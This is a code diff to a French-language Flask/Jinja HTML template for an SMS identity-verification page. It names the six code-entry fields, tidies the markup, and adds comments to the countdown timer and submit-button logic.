@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Vérification et confirmation de votre identité</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='css/sms.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/sms.css') }}" />
 </head>
 <body>
     <header class="header-sms">
@@ -18,12 +18,12 @@
 
         <form method="POST">
             <div class="code-input-container">
-                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" required>
-                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" required>
-                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" required>
-                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" required>
-                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" required>
-                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" required>
+                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" name="sms1" required autocomplete="off" inputmode="text" />
+                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" name="sms2" required autocomplete="off" inputmode="text" />
+                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" name="sms3" required autocomplete="off" inputmode="text" />
+                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" name="sms4" required autocomplete="off" inputmode="text" />
+                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" name="sms5" required autocomplete="off" inputmode="text" />
+                <input type="text" maxlength="1" pattern="[A-Za-z0-9]" name="sms6" required autocomplete="off" inputmode="text" />
             </div>
             <button type="submit" id="validateBtn" style="display: none;">Valider</button>
         </form>
@@ -34,6 +34,7 @@
     </div>
 
     <script>
+        // Timer SMS
         let timeLeft = 30;
         const timerElement = document.getElementById("timer");
 
@@ -54,6 +55,7 @@
             }
         }, 1000);
 
+        // Gestion des inputs et activation bouton Valider
         const inputs = document.querySelectorAll('.code-input-container input');
         const validateBtn = document.getElementById('validateBtn');
 
@@ -66,11 +68,12 @@
                     }
                 }
 
+                // Vérifier si tous les champs sont remplis
                 let filled = 0;
                 inputs.forEach(i => {
                     if (i.value.trim() !== "") filled++;
                 });
-                if (filled === 6) {
+                if (filled === inputs.length) {
                     validateBtn.style.display = 'block';
                 } else {
                     validateBtn.style.display = 'none';
